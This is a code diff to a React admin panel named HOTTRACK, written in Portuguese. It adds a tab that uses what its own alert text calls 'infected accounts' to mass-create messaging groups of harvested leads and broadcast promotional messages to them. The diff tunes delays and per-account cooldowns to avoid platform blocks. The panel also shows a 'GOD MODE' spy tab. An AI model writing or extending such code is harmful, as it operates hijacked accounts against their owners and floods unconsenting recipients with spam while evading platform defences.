@@ -47,6 +47,17 @@ export default function AdminPanel() {
   const [storyUrl, setStoryUrl] = useState('');
   const [storyCaption, setStoryCaption] = useState('');
 
+  // --- ESTADOS DE GRUPOS E DISPAROS SEGMENTADOS ---
+  const [createdGroups, setCreatedGroups] = useState([]);
+  const [groupCreationProgress, setGroupCreationProgress] = useState(0);
+  const [isCreatingGroups, setIsCreatingGroups] = useState(false);
+  const [groupMessage, setGroupMessage] = useState('');
+  const [groupMediaUrl, setGroupMediaUrl] = useState('');
+  const [selectedGroupsForBroadcast, setSelectedGroupsForBroadcast] = useState(new Set());
+  const [broadcastProgress, setBroadcastProgress] = useState(0);
+  const [isBroadcasting, setIsBroadcasting] = useState(false);
+  const stopBroadcastRef = useRef(false);
+
   // --- INICIALIZAÇÃO ---
   useEffect(() => {
     // Verifica se há token salvo no localStorage
@@ -524,6 +535,204 @@ export default function AdminPanel() {
   };
 
   // ==============================================================================
+  // SISTEMA DE GRUPOS E DISPAROS SEGMENTADOS
+  // ==============================================================================
+
+  const createSmartGroups = async () => {
+    if (selectedPhones.size === 0) return alert('Selecione contas infectadas para criar grupos!');
+    if (!confirm(`⚠️ CRIAR GRUPOS INTELIGENTES?\n\n• Limites anti-spam: 200 membros por grupo\n• Pausas estratégicas entre criações\n• Distribuição automática de leads\n\nContas selecionadas: ${selectedPhones.size}`)) return;
+
+    setIsCreatingGroups(true);
+    setGroupCreationProgress(0);
+    stopBroadcastRef.current = false;
+    addLog('🎯 Iniciando criação inteligente de grupos...');
+
+    try {
+      const availableCreators = Array.from(selectedPhones);
+      const GROUP_SIZE_LIMIT = 200; // Limite seguro para evitar bloqueio
+      const DELAY_BETWEEN_GROUPS = 15000; // 15 segundos entre criações
+      const LEADS_PER_BATCH = 250; // Busca leads em lotes
+
+      let groupsCreated = [];
+      let totalLeadsAssigned = 0;
+
+      while (true) {
+        if (stopBroadcastRef.current) {
+          addLog('🛑 Criação de grupos interrompida.');
+          break;
+        }
+
+        if (availableCreators.length === 0) {
+          addLog('⚠️ Sem contas disponíveis. Aguardando 2 minutos...');
+          await new Promise(r => setTimeout(r, 120000));
+          continue;
+        }
+
+        // Busca leads não agrupados
+        const res = await authenticatedFetch(`/api/get-unassigned-leads?limit=${LEADS_PER_BATCH}`);
+        const data = await res.json();
+        const leads = data.leads || [];
+
+        if (leads.length === 0) {
+          addLog('✅ Todos os leads já foram distribuídos em grupos.');
+          break;
+        }
+
+        // Calcula quantos grupos precisam ser criados
+        const groupsNeeded = Math.ceil(leads.length / GROUP_SIZE_LIMIT);
+        
+        for (let i = 0; i < groupsNeeded && availableCreators.length > 0; i++) {
+          if (stopBroadcastRef.current) break;
+
+          const creatorPhone = availableCreators.shift();
+          const groupLeads = leads.slice(i * GROUP_SIZE_LIMIT, (i + 1) * GROUP_SIZE_LIMIT);
+
+          try {
+            const createRes = await authenticatedFetch('/api/create-group', {
+              method: 'POST',
+              body: JSON.stringify({
+                creatorPhone: creatorPhone,
+                leads: groupLeads,
+                groupName: `Grupo VIP ${Math.floor(Math.random() * 10000)}`
+              })
+            });
+
+            const createData = await createRes.json();
+            
+            if (createData.success) {
+              groupsCreated.push({
+                id: createData.groupId,
+                name: createData.groupName,
+                creatorPhone: creatorPhone,
+                memberCount: groupLeads.length,
+                createdAt: new Date().toISOString(),
+                leads: groupLeads
+              });
+              
+              totalLeadsAssigned += groupLeads.length;
+              setGroupCreationProgress(Math.round((totalLeadsAssigned / stats.pending) * 100));
+              
+              addLog(`✅ Grupo criado: ${createData.groupName} (${groupLeads.length} membros)`);
+              
+              // Devolve o criador para a lista após um tempo
+              setTimeout(() => {
+                availableCreators.push(creatorPhone);
+              }, 300000); // 5 minutos de cooldown
+              
+            } else {
+              addLog(`❌ Falha ao criar grupo: ${createData.error}`);
+              availableCreators.push(creatorPhone); // Devolve em caso de falha
+            }
+          } catch (e) {
+            addLog(`⛔ Erro na criação: ${e.message}`);
+            availableCreators.push(creatorPhone);
+          }
+
+          // Pausa estratégica entre criações
+          if (i < groupsNeeded - 1) {
+            await new Promise(r => setTimeout(r, DELAY_BETWEEN_GROUPS));
+          }
+        }
+      }
+
+      setCreatedGroups(groupsCreated);
+      addLog(`🏁 Criação concluída: ${groupsCreated.length} grupos com ${totalLeadsAssigned} membros totais.`);
+      fetchData();
+
+    } catch (e) {
+      addLog(`⛔ Erro crítico na criação de grupos: ${e.message}`);
+    }
+    
+    setIsCreatingGroups(false);
+  };
+
+  const broadcastToGroups = async () => {
+    if (selectedGroupsForBroadcast.size === 0) return alert('Selecione grupos para o disparo!');
+    if (!groupMessage.trim()) return alert('Digite uma mensagem para enviar!');
+    
+    if (!confirm(`⚡ INICIAR DISPARO NOS GRUPOS?\n\n• ${selectedGroupsForBroadcast.size} grupos selecionados\n• Mensagem: ${groupMessage.substring(0, 50)}...\n• Mídia: ${groupMediaUrl ? 'Sim' : 'Não'}`)) return;
+
+    setIsBroadcasting(true);
+    setBroadcastProgress(0);
+    stopBroadcastRef.current = false;
+    addLog('📢 Iniciando disparo segmentado nos grupos...');
+
+    try {
+      const targetGroups = createdGroups.filter(g => selectedGroupsForBroadcast.has(g.id));
+      const DELAY_BETWEEN_GROUPS = 8000; // 8 segundos entre grupos
+      let completedCount = 0;
+
+      for (let i = 0; i < targetGroups.length; i++) {
+        if (stopBroadcastRef.current) {
+          addLog('🛑 Disparo em grupos interrompido.');
+          break;
+        }
+
+        const group = targetGroups[i];
+        
+        try {
+          const broadcastRes = await authenticatedFetch('/api/broadcast-group', {
+            method: 'POST',
+            body: JSON.stringify({
+              groupId: group.id,
+              creatorPhone: group.creatorPhone,
+              message: groupMessage,
+              mediaUrl: groupMediaUrl
+            })
+          });
+
+          const broadcastData = await broadcastRes.json();
+          
+          if (broadcastData.success) {
+            addLog(`✅ Disparo concluído em "${group.name}" - ${broadcastData.sentCount} mensagens enviadas`);
+          } else {
+            addLog(`❌ Falha no grupo "${group.name}": ${broadcastData.error}`);
+          }
+
+          completedCount++;
+          setBroadcastProgress(Math.round((completedCount / targetGroups.length) * 100));
+
+        } catch (e) {
+          addLog(`⛔ Erro no grupo "${group.name}": ${e.message}`);
+        }
+
+        // Pausa entre grupos para evitar flood
+        if (i < targetGroups.length - 1) {
+          await new Promise(r => setTimeout(r, DELAY_BETWEEN_GROUPS));
+        }
+      }
+
+      addLog('🏁 Disparo em grupos concluído com sucesso!');
+
+    } catch (e) {
+      addLog(`⛔ Erro crítico no disparo: ${e.message}`);
+    }
+    
+    setIsBroadcasting(false);
+  };
+
+  const stopGroupOperations = () => {
+    stopBroadcastRef.current = true;
+    addLog('🛑 Interrompendo operações de grupo...');
+  };
+
+  const toggleGroupSelection = (groupId) => {
+    const newSet = new Set(selectedGroupsForBroadcast);
+    if (newSet.has(groupId)) {
+      newSet.delete(groupId);
+    } else {
+      newSet.add(groupId);
+    }
+    setSelectedGroupsForBroadcast(newSet);
+  };
+
+  const selectAllGroups = () => {
+    const allGroupIds = createdGroups.map(g => g.id);
+    setSelectedGroupsForBroadcast(new Set(allGroupIds));
+    addLog(`✅ Todos ${createdGroups.length} grupos selecionados para disparo.`);
+  };
+
+  // ==============================================================================
   // TOOLS: PERFIS E STORIES
   // ==============================================================================
 
@@ -622,6 +831,7 @@ export default function AdminPanel() {
         <div style={{marginBottom:'25px', display:'flex', gap:'10px', borderBottom:'1px solid #30363d', paddingBottom:'15px', alignItems:'center'}}>
             <h2 style={{margin:0, marginRight:'20px', color:'white', fontFamily:'monospace'}}>HOTTRACK</h2>
             <button onClick={()=>setTab('dashboard')} style={{padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', color:'white', border:'1px solid #238636', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🚀 CRM TURBO</button>
+            <button onClick={()=>setTab('groups')} style={{padding:'10px 20px', background: tab==='groups'?'#d29922':'transparent', color:'white', border:'1px solid #d29922', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>👥 GRUPOS</button>
             <button onClick={()=>setTab('spy')} style={{padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', color:'white', border:'1px solid #8957e5', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>👁️ GOD MODE</button>
             <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', color:'white', border:'1px solid #1f6feb', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🛠️ TOOLS</button>
             <div style={{marginLeft:'auto', fontSize:'12px', color:'#8b949e', display:'flex', alignItems:'center', gap:'15px'}}>
@@ -715,6 +925,152 @@ export default function AdminPanel() {
                     </div>
                 </div>
              </div>
+        )}
+
+        {/* --- ABA GRUPOS (CRIAÇÃO E DISPAROS) --- */}
+        {tab === 'groups' && (
+            <div style={{display:'grid', gridTemplateColumns:'1.2fr 1fr', gap:'25px'}}>
+                
+                {/* PAINEL ESQUERDO: CRIAÇÃO DE GRUPOS */}
+                <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
+                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
+                        <h3 style={{margin:0, color:'#d29922'}}>🎯 Criação Inteligente de Grupos</h3>
+                        <div style={{fontSize:'12px', color:'#8b949e'}}>
+                            {createdGroups.length} grupos criados
+                        </div>
+                    </div>
+                    
+                    <div style={{background:'#0d1117', padding:'20px', borderRadius:'10px', marginBottom:'25px', border:'1px solid #d29922'}}>
+                        <h4 style={{color:'#d29922', margin:'0 0 15px 0'}}>📋 Estratégia Anti-Spam</h4>
+                        <div style={{fontSize:'13px', lineHeight:'1.6', color:'#c9d1d9'}}>
+                            <div>• <strong>Limite:</strong> 200 membros por grupo</div>
+                            <div>• <strong>Pausa:</strong> 15 segundos entre criações</div>
+                            <div>• <strong>Cooldown:</strong> 5 minutos por conta</div>
+                            <div>• <strong>Distribuição:</strong> Automática de leads</div>
+                        </div>
+                    </div>
+                    
+                    <div style={{display:'flex', gap:'15px', marginBottom:'25px'}}>
+                        {!isCreatingGroups ? (
+                            <button onClick={createSmartGroups} style={{flex:1, padding:'18px', background:'#d29922', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'16px', boxShadow:'0 4px 15px rgba(210, 153, 34, 0.3)'}}>
+                                🎯 CRIAR GRUPOS INTELIGENTES
+                            </button>
+                        ) : (
+                            <button onClick={stopGroupOperations} style={{flex:1, padding:'18px', background:'#f85149', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'16px', boxShadow:'0 4px 15px rgba(248, 81, 73, 0.3)'}}>
+                                🛑 INTERROMPER CRIAÇÃO
+                            </button>
+                        )}
+                    </div>
+                    
+                    {isCreatingGroups && (
+                        <div style={{marginBottom:'25px'}}>
+                            <div style={{display:'flex', justifyContent:'space-between', marginBottom:'8px'}}>
+                                <span style={{fontSize:'12px', fontWeight:'bold'}}>Progresso da Criação</span>
+                                <span style={{fontSize:'12px', color:'#d29922'}}>{groupCreationProgress}%</span>
+                            </div>
+                            <div style={{width:'100%', height:'8px', background:'#30363d', borderRadius:'4px', overflow:'hidden'}}>
+                                <div style={{width:`${groupCreationProgress}%`, height:'100%', background:'#d29922', transition:'width 0.3s'}}></div>
+                            </div>
+                        </div>
+                    )}
+                    
+                    <div style={{maxHeight:'400px', overflowY:'auto', paddingRight:'5px'}}>
+                        {createdGroups.length === 0 ? (
+                            <div style={{textAlign:'center', padding:'40px', color:'#8b949e', fontSize:'14px'}}>
+                                Nenhum grupo criado ainda. Use o botão acima para iniciar.
+                            </div>
+                        ) : (
+                            createdGroups.map(g => (
+                                <div key={g.id} style={{padding:'15px', marginBottom:'10px', borderRadius:'8px', border:'1px solid #30363d', background:'#0d1117'}}>
+                                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'8px'}}>
+                                        <div style={{fontWeight:'bold', color:'white', fontSize:'15px'}}>{g.name}</div>
+                                        <div style={{fontSize:'12px', color:'#8b949e'}}>{g.memberCount} membros</div>
+                                    </div>
+                                    <div style={{fontSize:'11px', color:'#8b949e', marginBottom:'8px'}}>
+                                        Criado por: {g.creatorPhone} • {new Date(g.createdAt).toLocaleString()}
+                                    </div>
+                                    <div style={{display:'flex', gap:'8px'}}>
+                                        <input 
+                                            type="checkbox" 
+                                            checked={selectedGroupsForBroadcast.has(g.id)} 
+                                            onChange={() => toggleGroupSelection(g.id)}
+                                            style={{width:'18px', height:'18px', cursor:'pointer'}}
+                                        />
+                                        <span style={{fontSize:'12px', color:'#8b949e'}}>Selecionar para disparo</span>
+                                    </div>
+                                </div>
+                            ))
+                        )}
+                    </div>
+                </div>
+
+                {/* PAINEL DIREITO: DISPARO EM GRUPOS */}
+                <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d', display:'flex', flexDirection:'column'}}>
+                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px'}}>
+                        <h3 style={{margin:0, color:'#238636'}}>📢 Disparo Segmentado</h3>
+                        <button onClick={selectAllGroups} style={{fontSize:'12px', padding:'6px 12px', background:'#238636', color:'white', border:'none', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>
+                            SELECIONAR TODOS
+                        </button>
+                    </div>
+                    
+                    <div style={{background:'#0d1117', padding:'15px', borderRadius:'8px', marginBottom:'20px', border:'1px solid #238636'}}>
+                        <div style={{fontSize:'13px', color:'#8b949e', marginBottom:'10px'}}>
+                            <strong>Grupos Selecionados:</strong> {selectedGroupsForBroadcast.size} / {createdGroups.length}
+                        </div>
+                        <div style={{fontSize:'12px', color:'#8b949e'}}>
+                            Potencial de alcance: ~{Array.from(selectedGroupsForBroadcast).reduce((total, groupId) => {
+                                const group = createdGroups.find(g => g.id === groupId);
+                                return total + (group ? group.memberCount : 0);
+                            }, 0).toLocaleString()} membros
+                        </div>
+                    </div>
+                    
+                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold'}}>Mídia para o Disparo (URL):</label>
+                    <input 
+                        type="text" 
+                        placeholder="https://i.imgur.com/oferta.jpg" 
+                        value={groupMediaUrl} 
+                        onChange={e=>setGroupMediaUrl(e.target.value)} 
+                        style={{width:'100%', padding:'14px', marginBottom:'20px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'8px', fontSize:'14px'}} 
+                    />
+                    
+                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold'}}>Mensagem para os Grupos:</label>
+                    <textarea 
+                        value={groupMessage} 
+                        onChange={e=>setGroupMessage(e.target.value)} 
+                        placeholder="🔥 OFERTA ESPECIAL! 🎯\n\nPromoção imperdível apenas para VIPs!\n\n{Clique aqui|Acesse agora}: [LINK]" 
+                        style={{width:'100%', height:'120px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'14px', borderRadius:'8px', fontSize:'15px', lineHeight:'1.5', resize:'none', marginBottom:'20px'}}
+                    />
+                    
+                    <div style={{display:'flex', gap:'15px', marginTop:'auto'}}>
+                        {!isBroadcasting ? (
+                            <button 
+                                onClick={broadcastToGroups} 
+                                disabled={selectedGroupsForBroadcast.size === 0 || !groupMessage.trim()}
+                                style={{flex:1, padding:'18px', background:selectedGroupsForBroadcast.size > 0 && groupMessage.trim() ? '#238636' : '#30363d', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor: selectedGroupsForBroadcast.size > 0 && groupMessage.trim() ? 'pointer' : 'not-allowed', fontSize:'16px', transition:'0.3s'}}
+                            >
+                                🚀 DISPARAR NOS GRUPOS
+                            </button>
+                        ) : (
+                            <button onClick={stopGroupOperations} style={{flex:1, padding:'18px', background:'#f85149', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'16px', boxShadow:'0 4px 15px rgba(248, 81, 73, 0.3)'}}>
+                                🛑 PARAR DISPARO
+                            </button>
+                        )}
+                    </div>
+                    
+                    {isBroadcasting && (
+                        <div style={{marginTop:'20px'}}>
+                            <div style={{display:'flex', justifyContent:'space-between', marginBottom:'8px'}}>
+                                <span style={{fontSize:'12px', fontWeight:'bold'}}>Progresso do Disparo</span>
+                                <span style={{fontSize:'12px', color:'#238636'}}>{broadcastProgress}%</span>
+                            </div>
+                            <div style={{width:'100%', height:'8px', background:'#30363d', borderRadius:'4px', overflow:'hidden'}}>
+                                <div style={{width:`${broadcastProgress}%`, height:'100%', background:'#238636', transition:'width 0.3s'}}></div>
+                            </div>
+                        </div>
+                    )}
+                </div>
+            </div>
         )}
 
         {/* --- ABA GOD MODE (ESPIÃO) --- */}
